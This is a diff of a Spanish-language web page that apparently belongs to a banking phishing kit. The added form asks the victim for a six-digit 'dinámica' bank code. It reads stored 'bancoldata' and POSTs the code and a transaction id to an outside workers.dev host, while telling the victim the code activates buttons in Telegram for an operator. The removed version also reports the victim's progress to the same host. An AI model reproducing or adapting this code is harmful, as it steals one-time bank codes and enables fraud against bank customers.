@@ -1,84 +1,160 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Acceso Autorizado</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #677eff;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      text-align: center;
-    }
-    .success-icon {
-      font-size: 4rem;
-      margin-bottom: 20px;
-    }
-    h1 {
-      margin-bottom: 10px;
-      font-size: 1.8rem;
-    }
-    p {
-      margin-bottom: 30px;
-      max-width: 300px;
-      line-height: 1.5;
-    }
-    button {
-      background: #2ed573;
-      border: none;
-      padding: 15px 40px;
-      border-radius: 25px;
-      color: white;
-      font-size: 1.1rem;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    button:hover {
-      background: #25c465;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ingresar Dinámica</title>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #f9f9f9;
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+}
+.container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    width: 350px;
+    text-align: center;
+}
+h2 {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 1.5rem;
+}
+.input-group {
+    margin-bottom: 20px;
+}
+input {
+    width: 100%;
+    padding: 12px 15px;
+    margin: 8px 0;
+    font-size: 16px;
+    border: 2px solid #ddd;
+    border-radius: 8px;
+    box-sizing: border-box;
+    transition: border-color 0.3s;
+}
+input:focus {
+    border-color: #28a745;
+    outline: none;
+}
+button {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: bold;
+    background: #28a745;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s;
+}
+button:hover {
+    background: #218838;
+}
+button:disabled {
+    background: #6c757d;
+    cursor: not-allowed;
+}
+.info {
+    background: #e9ecef;
+    padding: 10px;
+    border-radius: 5px;
+    margin-top: 15px;
+    font-size: 0.9rem;
+    color: #495057;
+}
+</style>
 </head>
 <body>
-  <div class="success-icon">✅</div>
-  <h1>¡Acceso Autorizado!</h1>
-  <p>Tu verificación ha sido exitosa. Ahora puedes continuar con el proceso.</p>
-  <button onclick="continuarProceso()">Continuar</button>
+<div class="container">
+    <h2>🔐 Ingresar Código Dinámica</h2>
+    <div class="input-group">
+        <input type="text" id="dinamica" placeholder="Ingresa el código de 6 dígitos" maxlength="6">
+    </div>
+    <button id="enviar">Enviar y Activar Botones</button>
+    
+    <div class="info">
+        ℹ️ Este código activará los botones en Telegram para continuar con la verificación.
+    </div>
+</div>
 
-  <script>
-    // Cuando la página carga, notificar a Telegram que llegamos a "código"
-    document.addEventListener('DOMContentLoaded', async () => {
-      try {
-        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-        const transactionId = bancoldata.transactionId;
-
-        if (transactionId) {
-          // Notificar a Telegram que estamos en el paso "código"
-          await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/notificar-estado', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              transactionId: transactionId,
-              paso: 'codigo'
-            })
-          });
-        }
-      } catch (error) {
-        console.error('Error notificando estado:', error);
-      }
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const dinamicaInput = document.getElementById('dinamica');
+    const enviarBtn = document.getElementById('enviar');
+    
+    // Validar que solo sean números
+    dinamicaInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        
+        // Habilitar botón solo si hay 6 dígitos
+        enviarBtn.disabled = e.target.value.length !== 6;
     });
+    
+    // Enviar con Enter
+    dinamicaInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && dinamicaInput.value.length === 6) {
+            enviarDinamica();
+        }
+    });
+});
 
-    function continuarProceso() {
-      window.location.href = 'otp.html';
+async function enviarDinamica() {
+    const dinamica = document.getElementById('dinamica').value;
+    const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+    const transactionId = bancoldata.transactionId;
+
+    if (!dinamica || dinamica.length !== 6) {
+        alert("Por favor ingresa un código de 6 dígitos.");
+        return;
     }
-  </script>
+
+    if (!transactionId) {
+        alert("Error: No se encontró la transacción actual.");
+        return;
+    }
+
+    try {
+        const response = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                id: transactionId,
+                dinamica: dinamica
+            })
+        });
+
+        const result = await response.json();
+        
+        if (result.ok) {
+            // Guardar dinámica en localStorage
+            bancoldata.dinamica = dinamica;
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            
+            alert("✅ Dinámica enviada correctamente. Los botones se han activado en Telegram.");
+            
+            // Redirigir a loading para esperar siguiente acción
+            window.location.href = 'loading.html';
+            
+        } else {
+            alert("❌ Error: " + (result.error || "No se pudo enviar la dinámica"));
+        }
+    } catch(e) {
+        console.error("Error:", e);
+        alert("❌ Error de conexión al enviar la dinámica.");
+    }
+}
+
+document.getElementById("enviar").addEventListener("click", enviarDinamica);
+</script>
 </body>
 </html>
